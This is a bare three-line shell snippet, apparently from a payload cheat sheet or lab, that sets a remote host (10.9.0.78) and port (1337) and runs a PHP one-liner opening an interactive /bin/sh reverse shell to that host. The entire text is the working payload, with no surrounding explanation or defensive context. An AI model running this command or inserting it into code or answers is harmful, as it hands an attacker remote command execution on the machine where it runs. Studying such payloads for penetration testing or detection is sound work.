export RHOST=10.9.0.78
export RPORT=1337
php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'
